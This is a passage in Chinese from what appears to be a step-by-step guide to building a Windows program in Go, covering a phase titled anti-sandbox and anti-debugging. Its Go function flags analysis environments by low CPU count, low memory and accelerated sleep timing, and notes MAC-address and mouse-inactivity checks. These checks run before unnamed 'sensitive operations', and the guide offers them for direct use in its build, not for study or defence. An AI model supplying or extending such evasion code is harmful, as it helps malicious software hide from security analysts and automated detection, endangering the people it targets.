    // ... 实现同上 ...
}
```

### 阶段三：集成反沙箱与反调试功能

在执行任何敏感操作之前，我们必须进行环境检查。以下是一些关键检测函数的 Golang 实现思路。

```go
// IsSandbox 集合了多种检测方法
func IsSandbox() bool {
    // 1. 硬件检测: CPU核心数 < 2 或 内存 < 2GB
    if runtime.NumCPU() < 2 {
        return true
    }
    var memStatus windows.MemoryStatusEx
    memStatus.Length = uint32(unsafe.Sizeof(memStatus))
    windows.GlobalMemoryStatusEx(&memStatus)
    if memStatus.TotalPhys/1024/1024/1024 < 2 { // 小于2GB
        return true
    }

    // 2. 虚拟机检测: 检查特定的MAC地址前缀
    // (需要更复杂的代码来枚举网络接口)

    // 3. 时间加速检测
    start := time.Now()
    time.Sleep(2 * time.Second)
    if time.Since(start) < 1500*time.Millisecond {
        return true
    }
    
    // 4. 用户活动检测: 检查5分钟内无鼠标移动 (需要调用 GetLastInputInfo)
    // ...

    return false
}

// IsDebugged 检测调试器
